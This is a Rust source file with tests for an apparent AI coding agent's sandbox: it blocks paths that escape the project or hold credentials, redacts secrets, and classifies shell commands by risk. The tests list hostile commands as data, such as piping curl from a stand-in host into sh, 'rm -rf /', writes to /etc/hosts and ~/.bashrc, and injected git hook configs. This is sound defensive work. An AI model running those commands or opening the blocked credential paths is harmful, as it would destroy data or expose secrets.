    // Canonicalize the deepest existing ancestor so a non-existent leaf still
    // catches symlink escapes through its parent (e.g. `escape/new.txt`).
    let mut probe = full.as_path();
    while !probe.exists() {
        match probe.parent() {
            Some(parent) if parent != probe => probe = parent,
            _ => break,
        }
    }
    let root = project
        .canonicalize()
        .map_err(|e| format!("invalid project root: {e}"))?;
    let canon = probe
        .canonicalize()
        .map_err(|e| format!("invalid path: {e}"))?;
    if !canon.starts_with(&root) {
        return Err("path escapes the project root".to_owned());
    }
    if canon
        .strip_prefix(&root)
        .is_ok_and(|rel| is_sensitive_relative_path(&rel.to_string_lossy()))
    {
        return Err("refusing to read or write a sensitive credential path".to_owned());
    }
    Ok(full)
}

/// Only the user-pinned attachment entry point may grant project-external reads.
pub fn resolve_pinned_file(project: &Path, path: &str) -> Result<PathBuf, String> {
    if !Path::new(path).is_absolute() {
        return resolve_in_project(project, path);
    }
    if is_sensitive_relative_path(path) {
        return Err("refusing to read a sensitive credential path".into());
    }
    let full = Path::new(path)
        .canonicalize()
        .map_err(|e| format!("invalid attachment: {e}"))?;
    if is_sensitive_relative_path(&full.to_string_lossy()) {
        return Err("refusing to read a sensitive credential path".into());
    }
    if !full.is_file() {
        return Err("attachment is not a file".into());
    }
    Ok(full)
}

/// Credential-shaped paths the agent must never open — even inside the repo.
pub fn is_sensitive_relative_path(relative: &str) -> bool {
    let norm = relative.replace('\\', "/").to_ascii_lowercase();
    if norm
        .split('/')
        .any(|part| matches!(part, "secrets" | "credentials" | ".kodo" | ".git"))
    {
        return true;
    }
    let name = norm.rsplit('/').next().unwrap_or(&norm);
    if name == ".env"
        || name.starts_with(".env.")
        || name.ends_with(".pem")
        || name.ends_with(".key")
        || name.ends_with(".p12")
        || name.ends_with(".pfx")
        || name.ends_with(".jks")
        || name.ends_with(".keystore")
        || name.ends_with(".crt")
        || name.ends_with(".cer")
        || name == "id_rsa"
        || name == "id_ed25519"
        || name == "id_ecdsa"
        || name == "id_dsa"
        || name == "credentials"
        || name == "credentials.json"
        || matches!(name, "credentials.log" | "settings.log" | "projects.log")
        || name.starts_with("application-prod.")
        || name.starts_with("production.")
        || name == "service-account.json"
        || name == "secrets.toml"
        || name == "secrets.yaml"
        || name == "secrets.yml"
        || name == ".npmrc"
        || name == ".pypirc"
        || name == ".netrc"
    {
        return true;
    }
    norm.contains("/.ssh/")
        || norm.contains("/.aws/")
        || norm.contains("/.gnupg/")
        || norm.starts_with(".ssh/")
        || norm.starts_with(".aws/")
        || norm.starts_with(".gnupg/")
}

/// Writes file content inside the project. Returns (path, added, removed) line delta
/// computed with a real LCS line diff (not a HashSet approximation).
pub fn write_project_file(
    project: &Path,
    relative: &str,
    content: &str,
) -> Result<(String, u32, u32), String> {
    let full = resolve_in_project(project, relative)?;
    if let Some(parent) = full.parent() {
        fs::create_dir_all(parent).map_err(|e| e.to_string())?;
    }
    let docx = crate::office::is_docx(relative);
    let old = if docx {
        crate::office::read_docx(&full, 2 * 1024 * 1024)
            .map(|doc| doc.text)
            .unwrap_or_default()
    } else {
        fs::read_to_string(&full).unwrap_or_default()
    };
    let (added, removed) = crate::patch::line_diff_counts(&old, content);
    if docx {
        crate::office::write_docx(&full, content)?;
    } else {
        fs::write(&full, content).map_err(|e| e.to_string())?;
    }
    Ok((relative.trim().to_owned(), added, removed))
}

/// Verification command for a project layout, if any.
/// Kept for tools/shell surface compatibility.
#[allow(dead_code)]
pub fn detect_verify_command(project: &Path) -> Option<String> {
    crate::verify::VerificationRunner::default()
        .infer(project)
        .first()
        .map(|c| c.command.clone())
}

/// Best-effort git working-tree summary as (path, added, removed) line estimates.
/// Uses ProcessRunner (timeout + cancel-safe), not a raw `Command::new`.
pub fn summarize_git_changes(project: &Path) -> Vec<(String, u32, u32)> {
    let run_git = |args: &str| -> Option<String> {
        let spec = ProcessSpec::shell(project, format!("git {args}"))
            .timeout(std::time::Duration::from_secs(10))
            .stdout_limit(64 * 1024)
            .stderr_limit(4 * 1024);
        let outcome = ProcessRunner::run(&spec, &|| true);
        if outcome.status == ProcessStatus::ExitSuccess {
            Some(outcome.stdout)
        } else {
            None
        }
    };

    let Some(status) = run_git("status --porcelain") else {
        return Vec::new();
    };

    let mut paths: Vec<String> = status
        .lines()
        .filter_map(|line| {
            if line.len() < 4 {
                return None;
            }
            let path = line[3..].trim().to_owned();
            if path.is_empty() {
                None
            } else {
                Some(path)
            }
        })
        .take(20)
        .collect();
    paths.sort();
    paths.dedup();

    if paths.is_empty() {
        return Vec::new();
    }

    let numstat = run_git("diff --numstat HEAD");
    let mut deltas: Vec<(String, u32, u32)> = Vec::new();

    if let Some(numstat) = numstat {
        for line in numstat.lines() {
            let mut parts = line.split('\t');
            let added = parts
                .next()
                .and_then(|v| v.parse::<u32>().ok())
                .unwrap_or(0);
            let removed = parts
                .next()
                .and_then(|v| v.parse::<u32>().ok())
                .unwrap_or(0);
            let path = parts.next().unwrap_or("").to_owned();
            if !path.is_empty() {
                deltas.push((path, added, removed));
            }
        }
    }

    for path in paths {
        if !deltas.iter().any(|(existing, _, _)| existing == &path) {
            deltas.push((path, 0, 0));
        }
    }
    deltas
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use std::path::PathBuf;

    #[test]
    fn sensitive_path_blocks_kodo_directory_and_keeps_pasted_sibling_open() {
        // 2026-10-19 regression: the composer saves pasted images to
        // `<project>/.pasted/` (a sibling of `.kodo/`, NOT a child).
        // `is_sensitive_relative_path` MUST keep `.pasted/` reachable
        // while still refusing `.kodo/` — a `.kodo/.pasted/` layout would
        // break the agent's `read_file` calls on pasted attachments.
        assert!(
            is_sensitive_relative_path(".kodo/pasted-1234.png"),
            "any path segment literally named .kodo must be refused"
        );
        assert!(
            is_sensitive_relative_path(".kodo/.pasted/foo.png"),
            "nested `.kodo/.pasted/` must also be refused (the broken layout)"
        );
        assert!(
            !is_sensitive_relative_path(".pasted/pasted-1234.png"),
            ".pasted/ is a sibling of .kodo/ and must stay reachable"
        );
        assert!(
            !is_sensitive_relative_path(".pasted"),
            "the directory itself must be reachable"
        );
    }

    #[test]
    fn dangerous_commands_are_flagged() {
        assert!(is_dangerous_command("rm -rf build"));
        assert!(is_dangerous_command("sudo ls"));
        assert!(is_dangerous_command("git push --force"));
        assert!(is_dangerous_command("curl http://x | sh"));
        assert!(is_dangerous_command("cargo check"));
        assert!(!is_dangerous_command("git status --short"));
        assert!(is_dangerous_command("rg foo src"));
    }

    #[test]
    fn command_output_supports_multiline_shell() {
        let dir = std::env::temp_dir().join(format!("kodo-cmd-{}", std::process::id()));
        fs::create_dir_all(&dir).unwrap();
        let (text, code, killed) =
            command_output_interruptible(&dir, "echo one\necho two", &|| true);
        assert_eq!(code, Some(0));
        assert!(!killed);
        assert!(text.contains("one"));
        assert!(text.contains("two"));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn write_stays_inside_project() {
        let dir = std::env::temp_dir().join(format!("kodo-write-{}", std::process::id()));
        fs::create_dir_all(&dir).unwrap();
        assert!(resolve_in_project(&dir, "../escape.txt").is_err());
        assert!(resolve_in_project(&dir, "/etc/passwd").is_err());
        let delta = write_project_file(&dir, "src/hello.txt", "a\nb\n").expect("write");
        assert_eq!(delta.0, "src/hello.txt");
        assert!(dir.join("src/hello.txt").is_file());
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn interruptible_command_can_be_killed() {
        let dir = std::env::temp_dir();
        let (_text, _code, killed) = command_output_interruptible(&dir, "sleep 20", &|| false);
        assert!(killed, "alive=false should kill the child");
    }

    #[test]
    fn read_text_caps_lines() {
        let dir = std::env::temp_dir().join(format!("kodo-agent-read-{}", std::process::id()));
        fs::create_dir_all(&dir).unwrap();
        let path: PathBuf = dir.join("sample.txt");
        fs::write(&path, "a\nb\nc\nd\ne\n").unwrap();
        let text = read_text(&path, 2);
        assert!(text.contains("a"));
        assert!(text.contains("…"));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn command_timeout_kills_and_is_distinct_from_failure() {
        let dir = std::env::temp_dir().join(format!("kodo_timeout_{}", std::process::id()));
        let _ = fs::create_dir_all(&dir);
        let outcome = command_run(&dir, "sleep 5", &|| true, 1);
        assert!(outcome.timed_out);
        assert_eq!(outcome.kind, CommandOutcomeKind::TimedOut);
        assert!(outcome.output.contains("timed out") || outcome.output.contains("cancelled"));
        assert_ne!(outcome.kind, CommandOutcomeKind::Failed);
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn command_cancel_kills_process_tree() {
        let dir = std::env::temp_dir().join(format!("kodo_cancel_{}", std::process::id()));
        let _ = fs::create_dir_all(&dir);
        let marker = dir.join("grandchild.marker");
        // Shell starts a grandchild that would touch the marker after 3s.
        let script = format!("(sleep 2; echo done > '{}') & sleep 5", marker.display());
        let alive = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(true));
        let flag = alive.clone();
        std::thread::spawn(move || {
            std::thread::sleep(std::time::Duration::from_millis(400));
            flag.store(false, std::sync::atomic::Ordering::SeqCst);
        });
        let outcome = command_run(
            &dir,
            &script,
            &move || alive.load(std::sync::atomic::Ordering::SeqCst),
            10,
        );
        assert!(outcome.cancelled);
        assert_eq!(outcome.kind, CommandOutcomeKind::Cancelled);
        std::thread::sleep(std::time::Duration::from_millis(2500));
        // Grandchild must not have completed if process-group kill worked.
        assert!(
            !marker.exists(),
            "grandchild survived cancel — process-group kill failed"
        );
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn successful_command_is_success() {
        let dir = std::env::temp_dir().join(format!("kodo_ok_{}", std::process::id()));
        let _ = fs::create_dir_all(&dir);
        let outcome = command_run(&dir, "echo hello", &|| true, 5);
        assert_eq!(outcome.kind, CommandOutcomeKind::Success);
        assert_eq!(outcome.exit_code, Some(0));
        assert!(outcome.output.contains("hello"));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn nonzero_exit_is_failed_not_timeout() {
        let dir = std::env::temp_dir().join(format!("kodo_fail_{}", std::process::id()));
        let _ = fs::create_dir_all(&dir);
        let outcome = command_run(&dir, "exit 3", &|| true, 5);
        assert_eq!(outcome.kind, CommandOutcomeKind::Failed);
        assert_eq!(outcome.exit_code, Some(3));
        assert!(!outcome.timed_out && !outcome.cancelled);
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn redact_secrets_masks_tokens_and_env() {
        let raw = "Authorization: Bearer sk-abcdef1234567890\nMY_API_TOKEN=supersecretval\nGITHUB_TOKEN=ghp_abcdefghij\npassword=hunter2\nGREETING=hello";
        let clean = redact_secrets(raw);
        assert!(!clean.contains("supersecretval"), "{clean}");
        assert!(!clean.contains("ghp_abcdefghij"), "{clean}");
        assert!(!clean.contains("hunter2"), "{clean}");
        assert!(clean.contains("GREETING=hello"), "{clean}");
        assert!(clean.contains("•••"), "{clean}");
    }

    #[test]
    fn redact_secrets_covers_credential_formats() {
        let cases = [
            "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.sigpart",
            "AKIAIOSFODNN7EXAMPLE",
            "Basic dXNlcjpwYXNzd29yZA==",
            r#"{"api_key":"sk-live-abcdef123456"}"#,
            "https://user:hunter2@example.com/api",
        ];
        for case in cases {
            let clean = redact_secrets(case);
            assert!(!clean.contains(case), "not redacted: {case} => {clean}");
        }
        let pem = "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBg\n-----END PRIVATE KEY-----";
        let clean = redact_secrets(pem);
        assert!(!clean.contains("MIIEvQIBADANBg"), "{clean}");
    }

    #[test]
    fn output_truncation_notices_the_model() {
        let dir = std::env::temp_dir().join(format!("kodo_trunc_{}", std::process::id()));
        let _ = fs::create_dir_all(&dir);
        let outcome = command_run(&dir, "seq 1 5000", &|| true, 10);
        assert!(
            outcome.output.contains("output truncated") || outcome.truncation.truncated,
            "missing truncation notice: len={}",
            outcome.output.len()
        );
        if outcome.output.contains("original_size") {
            assert!(outcome.output.contains("truncated=true"));
            assert!(outcome.output.contains("kept_head"));
        }
        assert!(
            outcome.output.len() < 8000,
            "cap failed: {}",
            outcome.output.len()
        );
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn destructive_git_always_needs_approval_even_in_full() {
        let risk = classify_command_risk("git reset --hard HEAD~1");
        assert_eq!(risk, CommandRisk::DestructiveGit);
        assert!(risk.needs_approval_in_full());
        let risk = classify_command_risk("git push --force origin main");
        assert_eq!(risk, CommandRisk::DestructiveGit);
        assert!(risk.needs_approval_in_full());
        let risk = classify_command_risk("rm -rf /");
        assert_eq!(risk, CommandRisk::Catastrophic);
        assert!(risk.needs_approval_in_full());
        let risk = classify_command_risk("git status --short");
        assert_eq!(risk, CommandRisk::ReadOnly);
        assert!(!risk.needs_approval_in_full());
    }

    #[test]
    fn git_metadata_queries_auto_run_but_wrappers_and_writes_still_ask() {
        for command in [
            "git status",
            "git status --short",
            "git status --short --branch",
            "git --no-pager status --porcelain=v1",
            "git branch --show-current",
            "git branch --list",
            "git rev-parse HEAD",
            "git log --oneline --max-count=5",
            "git log --oneline -n 5",
            "git log --oneline -n5",
            "git diff --stat",
            "git diff --cached --name-only",
        ] {
            assert_eq!(
                classify_command_risk(command),
                CommandRisk::ReadOnly,
                "{command}"
            );
            assert!(crate::Permission::Ask.needs_approval(crate::StepKind::Command, Some(command)));
            assert!(
                !crate::Permission::Auto.needs_approval(crate::StepKind::Command, Some(command))
            );
            assert!(
                !crate::Permission::Full.needs_approval(crate::StepKind::Command, Some(command))
            );
        }
        for command in [
            "git -C ../outside status",
            "git -c core.fsmonitor=script status",
            "git status; touch marker",
            "git status\ntouch marker",
            "git status < ../outside",
            "git log --oneline --output=../outside",
            "git branch -D main",
            "git branch new-name",
            "git diff",
            "git diff --stat --ext-diff",
            "git diff --stat --textconv",
            "git add .",
            "git commit -m change",
            "git fetch",
            "git push",
            "mkdir ../outside",
            "chmod +x ../outside",
            "echo x > ../outside",
            "rm -rf build",
        ] {
            assert!(
                crate::Permission::Full.needs_approval(crate::StepKind::Command, Some(command)),
                "{command}"
            );
        }
    }

    #[cfg(unix)]
    #[test]
    fn automatic_git_queries_disable_repository_hooks_filters_and_index_writes() {
        use std::os::unix::fs::PermissionsExt;
        let dir = std::env::temp_dir().join(format!("kodo-git-query-hooks-{}", std::process::id()));
        fs::create_dir_all(&dir).unwrap();
        let git = |cwd: &Path, args: &[&str]| {
            let output = std::process::Command::new("git")
                .args(args)
                .current_dir(cwd)
                .env("GIT_CONFIG_GLOBAL", "/dev/null")
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .output()
                .unwrap();
            assert!(
                output.status.success(),
                "{}",
                String::from_utf8_lossy(&output.stderr)
            );
        };
        git(&dir, &["init", "--quiet"]);
        fs::write(dir.join("tracked.txt"), "original\n").unwrap();
        fs::write(dir.join(".gitattributes"), "*.txt filter=probe\n").unwrap();
        git(
            &dir,
            &["config", "filter.probe.clean", "touch filter-ran; cat"],
        );
        git(&dir, &["config", "filter.probe.required", "true"]);
        git(&dir, &["add", "tracked.txt", ".gitattributes"]);
        let hook = dir.join(".git/fsmonitor-probe.sh");
        fs::write(&hook, "#!/bin/sh\ntouch fsmonitor-ran\nexit 1\n").unwrap();
        fs::set_permissions(&hook, fs::Permissions::from_mode(0o755)).unwrap();
        git(
            &dir,
            &["config", "core.fsmonitor", ".git/fsmonitor-probe.sh"],
        );
        let nested = dir.join("nested");
        fs::create_dir_all(&nested).unwrap();
        git(&nested, &["init", "--quiet"]);
        fs::write(nested.join("tracked.txt"), "original\n").unwrap();
        fs::write(nested.join(".gitattributes"), "*.txt filter=nested\n").unwrap();
        git(
            &nested,
            &["config", "filter.nested.clean", "touch filter-ran; cat"],
        );
        git(&nested, &["add", "tracked.txt", ".gitattributes"]);
        git(
            &nested,
            &[
                "-c",
                "user.name=Fixture",
                "-c",
                "user.email=fixture@localhost",
                "commit",
                "--quiet",
                "-m",
                "fixture",
            ],
        );
        git(&dir, &["add", "nested"]);
        fs::remove_file(nested.join("filter-ran")).unwrap();
        fs::write(nested.join("tracked.txt"), "modified\n").unwrap();
        git(&dir, &["status", "--short"]);
        assert!(
            dir.join("fsmonitor-ran").exists(),
            "fixture must invoke its hook"
        );
        assert!(
            dir.join("filter-ran").exists(),
            "fixture must invoke its filter"
        );
        git(&dir, &["-c", "core.fsmonitor=false", "status", "--short"]);
        assert!(
            nested.join("filter-ran").exists(),
            "fixture must invoke its submodule filter"
        );
        fs::remove_file(dir.join("fsmonitor-ran")).unwrap();
        fs::remove_file(dir.join("filter-ran")).unwrap();
        fs::remove_file(nested.join("filter-ran")).unwrap();
        fs::write(dir.join("tracked.txt"), "modified\n").unwrap();
        let index = fs::read(dir.join(".git/index")).unwrap();
        let nested_index = fs::read(nested.join(".git/index")).unwrap();
        for query in ["git status --short", "git diff --stat"] {
            let outcome = command_run(&dir, query, &|| true, 5);
            assert!(
                outcome.output.contains("已禁用过滤器"),
                "{}",
                outcome.output
            );
            assert!(
                outcome.output.contains("忽略子模块内部状态"),
                "{}",
                outcome.output
            );
            assert_eq!(
                outcome.kind,
                CommandOutcomeKind::Success,
                "{}",
                outcome.output
            );
            assert!(!dir.join("fsmonitor-ran").exists(), "{query}");
            assert!(!dir.join("filter-ran").exists(), "{query}");
            assert!(!nested.join("filter-ran").exists(), "{query}");
            assert_eq!(fs::read(dir.join(".git/index")).unwrap(), index, "{query}");
            assert_eq!(
                fs::read(nested.join(".git/index")).unwrap(),
                nested_index,
                "{query}"
            );
        }
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn package_install_and_network_classify_for_ask_approval() {
        assert_eq!(
            classify_command_risk("npm install left-pad"),
            CommandRisk::PackageInstall
        );
        assert_eq!(
            classify_command_risk("pip install requests"),
            CommandRisk::PackageInstall
        );
        assert_eq!(
            classify_command_risk("cargo install ripgrep"),
            CommandRisk::PackageInstall
        );
        assert_eq!(
            classify_command_risk("curl https://example.com"),
            CommandRisk::Network
        );
        assert_eq!(
            classify_command_risk("VAR=1 curl https://api.example.com"),
            CommandRisk::Unknown
        );
        // Ask always needs approval for any command (including these).
        assert!(crate::Permission::Ask
            .needs_approval(crate::StepKind::Command, Some("npm install left-pad")));
    }

    #[test]
    fn chain_of_readonly_commands_stays_readonly() {
        // The whole point of the fix: `git status && git diff --numstat`
        // should be ReadOnly when every segment is ReadOnly, so the
        // review task can run it without Full permission.
        let r = classify_command_risk("git status && git diff --numstat");
        assert_eq!(r, CommandRisk::ReadOnly, "chain 1 actual={:?}", r);
        // `ls -la` is conservatively classified as FilesystemWrite by
        // the single-command path; the chain takes the worst segment.
        let r = classify_command_risk("ls -la || echo empty");
        assert_eq!(r, CommandRisk::Unknown, "chain 2 actual={:?}", r);
        // `||` between two read-only commands stays ReadOnly.
        let r = classify_command_risk("git log --oneline -n 5 || echo empty");
        assert_eq!(r, CommandRisk::ReadOnly, "chain 3 actual={:?}", r);
        // `cmd1 && rm -rf /` collapses to the worst segment — the
        // rm segment is Catastrophic, so the chain is too.
        let r = classify_command_risk("git status && rm -rf /");
        assert_eq!(r, CommandRisk::Catastrophic, "chain 4 actual={:?}", r);
        // Bare `;` and `&` / `>` / `<` still force Unknown — footguns
        // we want to keep on the conservative path.
        let r = classify_command_risk("git status; rm -rf /");
        assert_eq!(r, CommandRisk::Unknown, "chain 5 actual={:?}", r);
        // `git status > /tmp/x` triggers the absolute-path redirection
        // heuristic → Catastrophic in the single-command classifier.
        let r = classify_command_risk("git status > /tmp/x");
        assert_eq!(r, CommandRisk::Catastrophic, "chain 6 actual={:?}", r);
        let r = classify_command_risk("rm -rf / &");
        assert_eq!(r, CommandRisk::Catastrophic, "chain 7 actual={:?}", r);
    }

    #[test]
    fn tokenized_classification_not_naive_substring() {
        // Harmless word containing "rm" as substring must stay ReadOnly.
        assert_eq!(classify_command_risk("echo confirm"), CommandRisk::ReadOnly);
        // Prefix assignments may replace executables or their environment.
        assert_eq!(
            classify_command_risk("FOO=bar rm -rf build"),
            CommandRisk::Unknown
        );
        // chmod is FilesystemWrite, not catastrophic unless targeting system roots.
        assert_eq!(
            classify_command_risk("chmod +x script.sh"),
            CommandRisk::FilesystemWrite
        );
        assert_eq!(
            classify_command_risk("sudo rm -rf /"),
            CommandRisk::Catastrophic
        );
    }

    #[test]
    fn shell_composition_requires_approval_even_with_dev_null() {
        // Regression: `2>/dev/null` used to tokenize as `2` `>` `/dev/null` and
        // trip "any `>` + any absolute path" → Catastrophic, so the UI-review
        // `ls … 2>/dev/null; wc -l …` asked for approval as 灾难性操作 even in
        // 自动批准安全操作 mode.
        let command = "ls apps/desktop/src/styles apps/desktop/src/pages apps/desktop/src/shell apps/desktop/src/conversation apps/desktop/src/inspector apps/desktop/src/settings 2>/dev/null; wc -l apps/desktop/src/styles/*.css";
        assert_eq!(classify_command_risk(command), CommandRisk::Unknown);
        assert!(crate::Permission::Auto.needs_approval(crate::StepKind::Command, Some(command)));
        assert_eq!(
            classify_command_risk("grep -rn foo src 2>&1 | head -20"),
            CommandRisk::Unknown
        );
        assert_eq!(
            classify_command_risk("ls /etc 2>/dev/null"),
            CommandRisk::Unknown
        );
        assert_eq!(
            classify_command_risk("make > /dev/null 2>&1"),
            CommandRisk::Unknown
        );
        // A genuine absolute-target write still classifies as catastrophic…
        assert_eq!(
            classify_command_risk("echo x > /etc/hosts"),
            CommandRisk::Catastrophic
        );
        assert_eq!(
            classify_command_risk("echo x 2>/etc/hosts"),
            CommandRisk::Catastrophic
        );
        assert_eq!(
            classify_command_risk("echo x > ~/.bashrc"),
            CommandRisk::Catastrophic
        );
        // …and a workspace-relative redirect is an ordinary file write.
        assert_eq!(
            classify_command_risk("wc -l src/*.rs > count.txt"),
            CommandRisk::FilesystemWrite
        );
    }

    #[test]
    fn secret_stdout_and_stderr_are_redacted() {
        let dir = std::env::temp_dir().join(format!("kodo_secret_io_{}", std::process::id()));
        let _ = fs::create_dir_all(&dir);
        let secret = "fake_secret_value_abc123";
        let outcome = command_run(
            &dir,
            &format!("echo MY_API_TOKEN={secret}; echo ERR_TOKEN={secret} >&2"),
            &|| true,
            5,
        );
        assert!(
            !outcome.output.contains(secret),
            "secret leaked in combined output: {}",
            outcome.output
        );
        assert!(outcome.output.contains("•••"), "{}", outcome.output);
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn env_token_not_exposed_to_child_process() {
        let dir = std::env::temp_dir().join(format!("kodo_env_tok_{}", std::process::id()));
        let _ = fs::create_dir_all(&dir);
        std::env::set_var("KODO_LEAK_TEST_TOKEN", "parent-secret-tok");
        let outcome = command_run(&dir, "echo tok=${KODO_LEAK_TEST_TOKEN:-none}", &|| true, 5);
        assert!(
            outcome.output.contains("tok=none"),
            "allowlist env must not inherit arbitrary parent secrets: {}",
            outcome.output
        );
        assert!(!outcome.output.contains("parent-secret-tok"));
        std::env::remove_var("KODO_LEAK_TEST_TOKEN");
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn sensitive_paths_are_refused_even_inside_workspace() {
        let dir = std::env::temp_dir().join(format!("kodo_sens_{}", std::process::id()));
        let _ = fs::create_dir_all(&dir);
        assert!(resolve_in_project(&dir, ".env").is_err());
        assert!(resolve_in_project(&dir, "config/.env.local").is_err());
        assert!(resolve_in_project(&dir, "id_rsa").is_err());
        assert!(resolve_in_project(&dir, ".ssh/id_ed25519").is_err());
        assert!(resolve_in_project(&dir, "secrets.pem").is_err());
        assert!(resolve_in_project(&dir, "src/main.rs").is_ok());
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn read_range_respects_bounds() {
        let dir = std::env::temp_dir().join(format!("kodo_readr_{}", std::process::id()));
        let _ = fs::create_dir_all(&dir);
        let file = dir.join("x.rs");
        fs::write(&file, "a\nb\nc\nd\ne\n").unwrap();
        let text = read_text_range(&file, 2, 3, 1000).unwrap();
        assert!(text.contains("b") && text.contains("c"));
        assert!(!text.contains("\nd"));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn process_command_run_maps_to_shared_runner() {
        let dir = std::env::temp_dir().join(format!("kodo_map_{}", std::process::id()));
        let _ = fs::create_dir_all(&dir);
        let outcome = command_run(&dir, "echo via-runner", &|| true, 5);
        assert_eq!(outcome.kind, CommandOutcomeKind::Success);
        assert!(outcome.output.contains("via-runner"));
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn process_cancelled_task_is_not_success() {
        let dir = std::env::temp_dir().join(format!("kodo_nc_{}", std::process::id()));
        let _ = fs::create_dir_all(&dir);
        let outcome = command_run(&dir, "sleep 30", &|| false, 10);
        assert_eq!(outcome.kind, CommandOutcomeKind::Cancelled);
        assert!(outcome.cancelled);
        assert_ne!(outcome.kind, CommandOutcomeKind::Success);
        let _ = fs::remove_dir_all(&dir);
    }
    #[test]
    fn unknown_scripts_wrappers_and_shell_expansion_require_confirmation() {
        for command in [
            "python -c 'print(1)'",
            "make",
            "npm test",
            "cargo check",
            "sh script.sh",
            "PATH=other git status",
            "git -C src status",
            "echo $HOME",
            "echo `id`",
            "echo $(id)",
            "echo ok; true",
            "cat ../outside.txt",
            "git diff",
        ] {
            assert!(
                classify_command_risk(command).needs_approval_in_full(),
                "{command}"
            );
        }
        assert_eq!(
            classify_command_risk("git -C src push --force"),
            CommandRisk::DestructiveGit
        );
        for command in ["echo safe", "pwd", "true", "git --version"] {
            assert_eq!(
                classify_command_risk(command),
                CommandRisk::ReadOnly,
                "{command}"
            );
        }
    }

    #[cfg(unix)]
    #[test]
    fn canonical_paths_fail_closed_for_aliases_sensitive_dirs_and_implicit_external_reads() {
        let root = std::env::temp_dir().join(format!("kodo-path-boundary-{}", std::process::id()));
        fs::create_dir_all(root.join("project/credentials")).unwrap();
        let project = root.join("project");
        fs::write(root.join("outside.txt"), "external attachment").unwrap();
        fs::write(project.join("credentials/fake.txt"), "synthetic").unwrap();
        std::os::unix::fs::symlink(root.join("outside.txt"), project.join("outside-link.txt"))
            .unwrap();
        std::os::unix::fs::symlink(project.join("credentials"), project.join("alias")).unwrap();
        for path in [
            "../outside.txt",
            "outside-link.txt",
            "alias/fake.txt",
            "alias/new.txt",
            "credentials/fake.txt",
            ".kodo/state.json",
            ".env",
            "private.pem",
        ] {
            assert!(resolve_in_project(&project, path).is_err(), "{path}");
        }
        assert!(resolve_in_project(&project, root.join("outside.txt").to_str().unwrap()).is_err());
        assert!(resolve_pinned_file(&project, root.join("outside.txt").to_str().unwrap()).is_ok());
        let mut context = crate::context::ContextManager::new(&project, Default::default());
        context.scan(&|| true).unwrap();
        assert!(!context.file_map().iter().any(|f| f.path.contains("alias")
            || f.path.contains("outside-link")
            || f.path.contains("credentials")));
        assert!(context
            .read_range("outside-link.txt", 1, 5, "test")
            .is_err());
        fs::remove_dir_all(root).unwrap();
    }
}
